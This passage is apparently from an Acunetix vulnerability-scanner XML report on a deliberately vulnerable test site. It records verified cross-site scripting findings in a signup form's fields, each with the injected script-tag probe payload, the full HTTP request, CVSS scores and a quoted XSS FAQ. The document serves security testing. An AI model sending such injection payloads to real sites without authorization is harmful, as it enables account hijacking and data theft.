<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 238
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%2540email.tst'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;3JE6(9633)&lt;/ScRiPt&gt;&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=ffhyvgif&amp;uuname=ffhyvgif]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:12 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 846
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="57" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">uphone</font></b> was set to <b><font color="dark">555-666-0606'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;3JE6(9381)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[uphone]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 236
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;3JE6(9381)&lt;/ScRiPt&gt;&amp;urname=olotsiri&amp;uuname=olotsiri]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:16 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 844
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="58" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">urname</font></b> was set to <b><font color="dark">olotsiri'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;3JE6(9206)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[urname]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 236
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=olotsiri'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;3JE6(9206)&lt;/ScRiPt&gt;&amp;uuname=kgmwftjg]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:18 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 844
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
